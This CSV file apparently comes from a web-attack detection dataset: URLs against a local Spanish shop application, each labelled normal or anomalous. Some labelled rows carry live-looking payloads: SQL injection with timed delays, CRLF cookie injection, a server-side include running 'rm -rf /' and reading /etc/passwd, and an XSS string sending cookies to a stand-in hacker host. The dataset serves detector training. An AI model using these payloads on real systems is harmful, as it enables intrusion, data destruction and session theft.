URL,Target
http://localhost:8080/tienda1/miembros/editar.jsp?modo=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&login=kinnaird&password=9r2sta1o191a&nombre=Nadra&apellidos=Taronger&email=moriarity%40centralitatelefonicavirtual.bn&dni=97649616B&direccion=112+26%2C+2F&ciudad=Mogarraz&cp=34247&provincia=Valencia&ntc=2104962244988688&B1=Registrar ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=306&B1=Pasar+por+caja ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%2B ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%2520 ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito ,1
http://localhost:8080/examplesWebApp/index.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6908&B1=Confirmar%2F ,1
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=daren9&password=acimentarse&nombre=Brian&apellidos=Puigveh%ED+Morande&email=tucker.faulkner%40clichotel.ck&dni=90660924F&direccion=Av.+Carlos+Marx+S%2FN+&ciudad=Millana&cp=02327&provincia=Cuenca&ntc=7309058964317313&B1=Registrar ,0
http://localhost:8080/compass/logon.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/imagenes/logo.gif.old ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=2542&B1=Confirmar ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=nichol&password=guardaguas&nombre=Grisel&apellidos=Cisneros+Tauler&email=goubanov%40delujos.bg&dni=10303147K&direccion=Plaza+Irineo+Gonzalez%2C+S%2FN+13%3FF&ciudad=U%F1a+de+Quintana&cp=50373&provincia=Barcelona&ntc=4330170884223124&B1=Registrar ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=4613&B1=Confirmar ,1
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9832&B1=Confirmar ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=simhan&password=1riot_0115a&nombre=Rohit&apellidos=Ejarque+Barbieri&email=nithsdale.livanov%40blanquillos.mo&dni=03206041W&direccion=C%2F+Vilagarcia+De+Arousa%2C+188%2C+&ciudad=Tronch%F3n&cp=47282&provincia=Girona&ntc=7196721387049140&B1=Registrar ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2AND+1%3D1 ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=falicov&password=desafinar&nombre=Caleb&apellidos=Hubach+Larrumbe&email=ranez%40sandrasummer.bi&dni=98501968Y&direccion=Calle+Rafael+Bravo+Gomez+179+5%3FH&ciudad=Santa+Marta+de+Tormes&cp=44394&provincia=%C1vila&ntc=1091303634326853&B1=Registrar ,0
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/IISSamples/sdk/asp/database/AddDelete_VBScript.asp ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=graydon&password=equilibrio&nombre=Eliseo&apellidos=Mallat+Paiva&email=zens-trebaol6%40gesautonomos.rw&dni=46157420P&direccion=San+Antonio%2C+105%2C+9-D&ciudad=Gri%F1%F3n&cp=18339&provincia=Zamora&ntc=0644186942198058&B1=Registrar ,0
http://localhost:8080/tienda1/publico/anadir.jsp?idA=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=47&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%252B ,1
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=73&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sarene&pwd=pROHIJamIenTo&rememberA=off&B1=Entrar ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3394&B1=Pasar+por+caja ,0
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=2612&B1=Pasar+por+caja ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=amant&password=coyotera&nombre=Aleardo&apellidos=Sellares+Brihuega&email=miguel_bridge%40irmedia.nl&dni=15074727K&direccion=Calle+Rodrigo+De+Triana+189%2C+6E&ciudad=Ametlla+del+Vall%E8s%2C+L%27&cpA=44597&provincia=Guadalajara&ntc=2988316222731904&B1=Registrar ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=richards&password=v0r7fica6i24&nombre=Patricio&apellidos=De+Sol%E0+Butticaz&email=junior%40esteticadayda.bo&dni=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&direccion=C%2F+Candeleria+179%2C+&ciudad=Sant+Miquel+de+Fluvi%E0&cp=13100&provincia=Valladolid&ntc=5101892686215961&B1=Registrar ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E ,1
http://localhost:8080/tienda1/miembros/editar.jsp/asf-logo-wide.gif ,1
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1.Bak ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=622&B1=Confirmar%2F ,1
http://localhost:8080/tienda1/publico/6909030637832563290.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=joelly&password=r8cid0va&nombre=Flaviano&apellidos=Sarri%E0+Orbe&email=oshea_knowles%40tiaherminia.gh&dni=14977979B&direccion=Calle+Del+Llenguadoc+S%2FN%2C+6E&ciudad=Pujalt&cp=45183&provincia=Valencia&ntc=0269447503610316&B1=Registrar ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precioA=85&cantidad=37&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/asf-logo-wide.gif/.OLD ,1
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 ,1
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727 ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=672&B1=Confirmar ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kolahi45&pwd=pr0to&remember=on&B1=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E ,1
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=ploof&password=p04u803&nombre=Alenda&apellidos=Pruneda+De+Velasco&email=caron%40nexuspark.ai&dni=85853074BP&direccion=Carretera+Lebrija%2C+25+&ciudad=Santo+Tom%E9+del+Puerto&cp=42126&provincia=C%E1ceres&ntc=7582936564650481&B1=Registrar ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mareah&password=malh5jo&nombre=Eulalio&apellidos=Tal%F3+Gorriz&email=trissenaar%40tetdevelocidad.uk&dni=18684547Z&direccion=C%2F+Hermanos+Senise+Colmenero%2C+153%2C+3-D&ciudad=Forua&cp=08470&provincia=Valencia&ntc=9004541540453342&B1=Registrar ,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ming-min&password=recambiar&nombre=Biblis&apellidos=Gascan+Vilar%F3&email=forte_cortesa%40delujos.ba&dni=05041400F&direccion=Ramon+Bonifaz%2C+6+6%3FH&ciudad=Bergondo&cp=0361A&provincia=M%E1laga&ntc=7946193683078686&B1=Registrar ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/global/creditos.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=898&B1=Confirmar ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes.old ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/miembros/fotos.jsp.INC ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%7C ,1
http://localhost:8080/tienda1/miembros/editar.jsp/asf-logo-wide.gif.Bak ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hoyt&password=tope4a5o&nombre=Dalmacio&apellidos=Lehmann+Cruanas&email=maria-terzon%40lingotes.com.org&dni=46208410F&direccion=Calle+Torreta+126+9C&ciudad=Sukarrieta&cp=05140&provincia=C%E1ceres&ntc=9598787825284298&B1=Registrar ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=703&B1=Confirmar ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidad=89&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/asf-logo-wide ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=rodschat&password=5mp1o0isad65&nombre=Tarcisio&apellidos=Merlach+Corminas&email=azar%40archivodeimagenes.eu&dni=63154198Q&direccion=Carlos+Balenchana+83%2C+&ciudad=Lech%F3n&cp=24882&provincia=Girona%252B&ntc=7458916461034626&B1=Registrar ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=82&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=rahmani&password=decimon4na&nombre=Jorge&apellidos=Morande&email=dawson%40eco-pro.to&dni=37871926B&direccion=Calle+Archiduque+Carlos%2C+97+9%3FG&ciudad=Vilassar+de+Mar&cp=01212&provincia=Burgos&ntc=5287631327187373&B1=Registrar ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/global/asf-logo-wide.old ,1
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=vanda&pwd=5esl4chu6002ra&remember=off%2B&B1=Entrar ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=letsome9&password=simple&nombre=Perfecta&apellidos=Lowery+Volta&email=seel%40indorec.ge&dni=05171912V&direccion=C%2F+Agustina+Fierra%2C+49%2C+&ciudad=Villabasta+de+Vald%2F%3Favia&cp=46715&provincia=Burgos&ntc=6556979183874771&B1=Registrar ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=shiley&password=TiE3t54&nombre=Yaiti&apellidos=Marcano+Giner&email=marmont_doran%40peliculasen3d.ng&dni=52382768S&direccion=Carretera+Aravaca+a+Carabanchel%2C+194+8-E&ciudad=Berrocal&cp=17732&provincia=Soria&ntc=4787579213279770&B1=Registrar ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=galina&password=4a9a8g%F38&nombre=Geraldina&apellidos=Cervi%E0+Fornas&email=funicello-gadden%4018horas.fo&dni=75000191C&direccion=Saavedra+Fajardo+S%2FN%2C+3-H&ciudad=Revellinos&cp=31435&provincia=M%E1laga&ntc=8095702483441031&B1=Registrar ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kobeski&password=prueba&nombre=Vivencio&apellidos=Goyenaga&email=lenya%40fbi-criminal-network.com.mil&dni=74835105M&direccion=Hermanos+Barral+61+&ciudad=Cantaracillo&cp=40190&provincia=Navarra&ntc=5076820691273276&B1=Registrar ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/global/creditos.jsp ,0
http://localhost:8080/iisadmpwd/aexp3.htr ,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=rutledge&pwd=f8av2&remember=off&B1=Entrar ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8252&B1=Pasar+por+caja ,0
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lilllie8&pwd=4mpo599c7miento&rememberA=on&B1=Entrar ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=sandi&password=mo3e5e5o&nombre=Si%F3n&apellidos=Pall%E0s+De+Buran&email=skaff%40hipersevilla.nc&dni=98089077B&direccion=Calle+Puerta+Del+Sol%2C+88%2C+&ciudad=Grijota&cp=32520&provincia=Zaragoza&ntc=7926381447140293&B1=Registrar ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=richey&pwd=s%EDntoma&remember=on&B1=Entrar ,0
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/iissamples/ExAir/IEPush/Channel.asp ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/global/creditos.jsp/~ ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/global/creditos.jsp ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=wilson&password=mo8os7&nombre=Jaaziel&apellidos=Pirotto+Nin&email=carew1%40koinup.ni&dni=69309273S&direccion=Calle+Practicante+Calixto+Rodriguez+163%2C+&ciudad=Zael&cp=16582&provincia=A+Coru%F1a&ntc=6959239796912888&B1=Registrar ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/IISSamples/sdk/asp/docs/CodeBrws.asp ,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
